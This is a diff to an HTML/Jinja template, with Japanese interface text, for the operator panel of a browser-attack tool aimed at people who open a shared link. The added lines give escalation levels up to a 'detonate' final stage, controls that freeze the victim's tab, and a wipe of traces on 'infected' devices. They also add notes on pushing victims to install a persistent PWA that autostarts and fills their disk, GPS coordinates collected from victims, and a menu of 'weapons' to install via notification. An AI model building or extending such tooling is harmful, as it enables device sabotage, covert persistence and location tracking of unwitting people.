@@ -15,6 +15,8 @@ a.btn,button{padding:7px 13px;border-radius:8px;background:#2b3346;color:#e6e9ef
 a.go{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
 button.fire{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:700;padding:10px 18px}
 button.stop{background:#3a2a2a;border-color:#5a3f3f;color:#f0b429}
+button.boom{background:#7a1f1f;border-color:#c0392b;color:#ffd9d9;font-weight:700}
+button.wipe{background:#3a2a5a;border-color:#6a4fbf;color:#e0d9ff}
 .row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:8px}
 .tabs{display:flex;gap:6px;margin:6px 0 12px;flex-wrap:wrap}
 .tabs a{padding:7px 14px;border-radius:999px;background:#20242e;border:1px solid #39415a;
@@ -24,10 +26,10 @@ table{width:100%;border-collapse:collapse;font-size:12px}
 th,td{text-align:left;padding:4px 6px;border-bottom:1px solid #232734;vertical-align:top}
 details{margin:6px 0;background:#11141a;border:1px solid #232734;border-radius:8px;padding:8px}
 summary{cursor:pointer;font-size:12.5px}
-.kv{display:grid;grid-template-columns:180px 1fr;gap:2px 8px;font-size:11.5px;margin-top:6px}
+.kv{display:grid;grid-template-columns:190px 1fr;gap:2px 8px;font-size:11.5px;margin-top:6px}
 .kv .k{color:#8b93a7;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
 .kv .v{color:#c7cddb;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
-img.shot{max-width:220px;border-radius:8px;border:1px solid #262b36;display:block;margin-top:6px}
+img.shot{max-width:240px;border-radius:8px;border:1px solid #262b36;display:block;margin-top:6px}
 input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#9aa3b2;
   padding:7px 9px;background:#11141a;border:1px solid #262b36;border-radius:6px}
 select,input[type=text]{padding:5px 8px;background:#11141a;color:#e6e9ef;
@@ -41,13 +43,22 @@ form.inline{display:inline;margin:0}
 .seg label{padding:0;font-size:12.5px;background:#20242e;color:#c7cddb;cursor:pointer}
 .seg input{display:none}
 .seg input:checked + span{background:#4c8dff;color:#fff}
-.seg span{display:block;padding:7px 14px}
+.seg span{display:block;padding:7px 13px}
 .state{display:inline-block;font-size:11px;padding:2px 10px;border-radius:999px;
   background:#20242e;border:1px solid #39415a;color:#c7cddb}
 .state.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
 .state.off{background:#3a2a2a;border-color:#5a3f3f;color:#f0b429}
 .chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
 .chk input{width:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
+  background:#20242e;border:1px solid #39415a;color:#c7cddb}
+.badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
+.sg{background:#101d18;border:1px solid #1f5c42}
+.sg h3{color:#7ee08a}
+.lvl{display:flex;gap:5px;flex-wrap:wrap;margin-top:8px}
+.lvl form{margin:0}
+.lvl button{min-width:46px;text-align:center;padding:8px 6px;line-height:1.25}
+.lvl button.on{background:#00ff88;border-color:#00ff88;color:#062;font-weight:700}
 </style></head><body>
 
 <div class="tabs">
@@ -63,10 +74,62 @@ form.inline{display:inline;margin:0}
 <div class="dim">{{ mode_desc }}</div>
 {% if caution %}<div class="caution">{{ caution }}</div>{% endif %}
 
+{% if is_sg %}
+<div class="panel sg">
+  <h3>◎ SINGULARITY 制御盤 — 現在 L{{ level }}「{{ level_label }}」</h3>
+  <div class="dim">{{ level_desc }}</div>
+  <div class="lvl">
+    {% for l in levels %}
+    <form method="post" action="/vp/{{ code }}/level">
+      <input type="hidden" name="level" value="{{ l }}">
+      <button type="submit" class="{{ 'on' if level == l else '' }}">L{{ l }}<br>
+        <span style="font-size:10px">{{ ['偵察','標準','加熱','制圧','焦土','特異点'][l] }}</span>
+      </button>
+    </form>
+    {% endfor %}
+  </div>
+  <div class="row">
+    <form method="post" action="/vp/{{ code }}/detonate" style="margin:0">
+      <button class="boom" type="submit">💥 最終形態へ（L5）</button></form>
+    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
+      <input type="hidden" name="freeze" value="">
+      <button type="submit">凍結 自動（既定）</button></form>
+    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
+      <input type="hidden" name="freeze" value="off">
+      <button type="submit">凍結 off</button></form>
+    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
+      <input type="hidden" name="freeze" value="soft">
+      <button type="submit">凍結 soft（約1fps）</button></form>
+    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
+      <input type="hidden" name="freeze" value="hard">
+      <button type="submit">凍結 hard（完全停止）</button></form>
+  </div>
+  <div class="row">
+    <form method="post" action="/vp/{{ code }}/wipe" style="margin:0"
+          onsubmit="return confirm('感染端末の痕跡を全部消しますか？（凍結中でも届きます）')">
+      <button class="wipe" type="submit">🧹 痕跡を完全消去（wipe ×{{ wipe_seq }}）</button></form>
+  </div>
+  <div class="dim" style="margin-top:8px">
+    現在の凍結設定: <b>{{ freeze or '自動（L5でsoft）' }}</b>。
+    wipe とレベル変更は <b>Service Worker 経由で navigate させる</b>ので、
+    相手のタブが「応答なし」でも必ず届きます。<br>
+    停止させたいだけなら <b>停止ボタン → そのあと wipe</b> が確実です。
+  </div>
+  <div class="dim" style="margin-top:8px">
+    📲 相手が「今すぐインストール」を押すと <b>PWAとして端末に常駐</b>します。
+    インストール後は最低 <b>L{{ install_level }}</b> で回り続け、
+    OSログイン時にも自動起動します。ストレージも自動で永続化されるため、
+    埋めたディスクは簡単には回収されません。<br>
+    消すには相手が <b>chrome://apps</b> からアンインストール＋サイトデータ消去するか、
+    こちらの <b>wipe</b> が必要です。
+  </div>
+</div>
+{% endif %}
+
 <div class="panel">
   <h3>🕹 操作盤（こちら側）</h3>
   <form method="post" action="/vp/{{ code }}/set" class="row">
-    <span class="dim">1セットの枚数</span>
+    <span class="dim">1セットの枚数（窓爆弾・ミックス用）</span>
     <span class="seg">
       <label><input type="radio" name="winset" value="10"
         {% if winset == 10 %}checked{% endif %}><span>10</span></label>
@@ -101,6 +164,8 @@ form.inline{display:inline;margin:0}
     <a class="btn go" href="{{ share }}" target="_blank">開いて確認</a>
   </div>
   {% if is_new %}<div class="dim" style="color:#7ee08a">✓ 作成しました。上のURLを送ってください。</div>{% endif %}
+  {% if boom %}<div class="dim" style="color:#ff9a9a">💥 最終形態（L5）に移行しました。</div>{% endif %}
+  {% if wiped %}<div class="dim" style="color:#c3b6ff">🧹 wipe を送信しました。相手のタブが開いていれば数十秒で消えます。</div>{% endif %}
 </div>
 
 <h3>踏んだ端末（{{ total }}件）</h3>
@@ -111,6 +176,11 @@ form.inline{display:inline;margin:0}
     {{ h.device or '不明' }} {{ h.os or '' }} / {{ h.browser or '不明' }}
     {% if h.inapp %}（{{ h.inapp }}内）{% endif %}
     {% if h.city %} / {{ h.city }}{% endif %}
+    {% if h.gps_lat %} / 🛰{{ '%.4f'|format(h.gps_lat) }},{{ '%.4f'|format(h.gps_lon) }}{% endif %}
+    {% set kk = (by_hit.get(h.id, []) | map(attribute='key') | list) %}
+    {% if 'install.installed' in kk %}<span class="badge on">📲 常駐</span>{% endif %}
+    {% if 'install.available' in kk %}<span class="badge">インストール可</span>{% endif %}
+    {% if 'verdict.resident' in kk %}<span class="badge on">🪟 アプリ窓</span>{% endif %}
     <span class="mono"> #{{ h.id }}</span>
   </summary>
   <div class="kv">
@@ -154,8 +224,7 @@ form.inline{display:inline;margin:0}
       <option value="0" {% if winset == 0 %}selected{% endif %}>∞（止まるまで）</option>
     </select></label>
   <label>飛び先 <input type="text" name="dest" value="{{ link.dest or '' }}"></label>
-  <label>通知文
-    <input type="text" name="notify_text" value="{{ notify_text }}"></label>
+  <label>通知文 <input type="text" name="notify_text" value="{{ notify_text }}"></label>
   <label>その通知でインストールさせる兵器
     <select name="notify_mode">
       <option value="" {% if not notify_mode %}selected{% endif %}>なし（自動）</option>
